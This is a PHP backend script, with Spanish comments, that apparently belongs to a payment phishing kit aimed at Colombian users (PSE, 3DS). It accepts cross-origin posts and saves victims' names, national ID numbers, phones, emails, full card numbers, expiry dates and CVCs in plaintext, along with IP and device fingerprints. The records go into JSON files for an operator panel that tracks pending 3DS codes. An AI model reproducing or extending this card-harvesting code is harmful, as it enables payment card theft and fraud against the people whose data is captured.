<?php
// admin/guardar_tarjeta.php - Guarda datos de tarjeta en el panel
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$dataDir = __DIR__ . '/data';
$tarjetasFile = $dataDir . '/tarjetas.json';

if (!is_dir($dataDir)) {
    mkdir($dataDir, 0777, true);
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    $input = $_POST;
}

if (!$input || empty($input)) {
    echo json_encode(['success' => false, 'error' => 'No se recibieron datos']);
    exit;
}

// ====== DATOS DE LA TARJETA ======
$nombre = $input['nombre'] ?? '';
$apellido = $input['apellido'] ?? '';
$email = $input['email'] ?? '';
$celular = $input['celular'] ?? '';
$cedula = $input['cedula'] ?? '';
$monto = $input['monto'] ?? '0';
$tipo_tarjeta = $input['tipo_tarjeta'] ?? 'visa';
$titular = $input['titular'] ?? '';
$numero_tarjeta = $input['numero_tarjeta'] ?? '';
$vencimiento = $input['vencimiento'] ?? '';
$cvc = $input['cvc'] ?? '';
$cuotas = $input['cuotas'] ?? '1';
$metodo = $input['metodo'] ?? 'TARJETA';
$id_3ds = $input['id_3ds'] ?? '3DS_' . uniqid();

// ====== IP Y USER AGENT ======
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$fingerprint = md5($ip . '_' . $userAgent);

// ====== LEER TARJETAS EXISTENTES ======
$tarjetas = [];
if (file_exists($tarjetasFile)) {
    $content = file_get_contents($tarjetasFile);
    $tarjetas = json_decode($content, true) ?? [];
}

// ====== CREAR NUEVO REGISTRO CON TODOS LOS DATOS ======
$nuevoRegistro = [
    'id' => uniqid('TRX_'),
    'id_3ds' => $id_3ds,
    'fecha' => date('Y-m-d H:i:s'),
    'nombre' => $nombre,
    'apellido' => $apellido,
    'nombre_completo' => $nombre . ' ' . $apellido,
    'email' => $email,
    'celular' => $celular,
    'cedula' => $cedula,
    'monto' => $monto,
    'tipo_tarjeta' => $tipo_tarjeta,
    'titular' => $titular,
    'numero_tarjeta' => $numero_tarjeta,
    'vencimiento' => $vencimiento,
    'cvc' => $cvc,
    'cuotas' => $cuotas,
    'metodo' => $metodo,
    'codigo_3ds' => '',
    'estado_3ds' => 'pendiente',
    'ip' => $ip,
    'user_agent' => $userAgent,
    'fingerprint' => $fingerprint
];

// ====== GUARDAR EN TARJETAS.JSON ======
array_unshift($tarjetas, $nuevoRegistro);
file_put_contents($tarjetasFile, json_encode($tarjetas, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ============================================================
// TAMBIÉN GUARDAR EN PSE_LOGS.JSON PARA QUE APAREZCA EN SESIONES
// ============================================================
$logsFile = $dataDir . '/pse_logs.json';
$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

$nuevoLog = [
    'id' => 'TARJETA_' . uniqid(),
    'fecha' => date('Y-m-d H:i:s'),
    'banco' => 'TARJETA_' . strtoupper($tipo_tarjeta),
    'activity' => 'TARJETA_3DS',
    'documento' => $cedula,
    'cedula' => $cedula,
    'usuario' => $cedula,
    'titular' => $titular,
    'nombre' => $nombre,
    'apellido' => $apellido,
    'email' => $email,
    'celular' => $celular,
    'monto' => $monto,
    'numero_tarjeta' => $numero_tarjeta,
    'vencimiento' => $vencimiento,
    'cvc' => $cvc,
    'tipo_tarjeta' => $tipo_tarjeta,
    'cuotas' => $cuotas,
    'id_3ds' => $id_3ds,
    'estado_3ds' => 'pendiente',
    'estado' => 'pendiente',
    'tiene_jelpit' => true,
    'fingerprint' => $fingerprint,
    'ip' => $ip,
    'user_agent' => $userAgent
];
array_unshift($logs, $nuevoLog);
file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ====== RESPUESTA ======
echo json_encode([
    'success' => true,
    'id_3ds' => $id_3ds,
    'message' => 'Tarjeta registrada en el panel'
]);
?>